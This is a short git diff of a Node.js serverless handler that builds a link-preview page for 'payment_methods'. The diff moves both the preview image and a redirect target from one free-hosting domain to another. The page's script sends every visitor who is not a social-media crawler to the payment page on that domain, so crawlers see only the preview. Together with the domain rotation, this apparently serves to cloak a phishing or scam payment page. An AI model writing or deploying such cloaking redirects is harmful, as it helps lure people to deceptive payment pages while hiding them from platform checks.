@@ -2,7 +2,7 @@ module.exports = (req, res) => {
   const { searchParams } = new URL(req.url, 'http://localhost');
   const timestamp = searchParams.get('t') || '';
 
-  const imageUrl = `https://japan-ab.ct.ws/uploads/payment_methods_og.jpg${timestamp ? '?t=' + timestamp : ''}`;
+  const imageUrl = `https://japan-ab.ftp.sh/uploads/payment_methods_og.jpg${timestamp ? '?t=' + timestamp : ''}`;
 
   const html = `
     <!DOCTYPE html>
@@ -28,7 +28,7 @@ module.exports = (req, res) => {
 
         <script>
           if (!/bot|facebook|telegram|twitter|linkedin|whatsapp/i.test(navigator.userAgent)) {
-            window.location.href = 'https://japan-ab.ct.ws/payment_methods.html';
+            window.location.href = 'https://japan-ab.ftp.sh/payment_methods.html';
           }
         </script>
       </body>
